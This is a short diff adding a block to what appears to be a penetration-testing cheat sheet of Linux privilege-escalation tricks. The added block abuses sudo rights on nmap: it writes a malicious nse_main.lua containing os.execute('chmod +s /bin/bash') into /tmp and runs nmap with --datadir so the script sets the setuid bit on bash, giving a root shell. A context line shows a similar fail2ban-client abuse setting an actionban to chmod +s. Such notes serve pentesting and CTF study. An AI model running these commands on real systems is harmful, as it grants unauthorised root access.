@@ -703,6 +703,19 @@ sudo /usr/bin/fail2ban-client set mbilling_ddos action evil  actionban "chmod +s
 sudo /usr/bin/fail2ban-client set mbilling_ddos  banip 1.2.3.4 
 ```
 
+```bash
+
+# Nmap : If interactive is disabled and we can only run --datadir and -sCV
+
+find / -type f -name nse_* 2>/dev/null
+/usr/share/nmap/nse_main.lua
+
+echo "os.execute('chmod +s /bin/bash')" > /tmp/nse_main.lua
+
+sudo /usr/bin/nmap --datadir=/tmp 127.0.0.1 -sC
+
+```
+
 ```powershell
 
 # Reboot : 
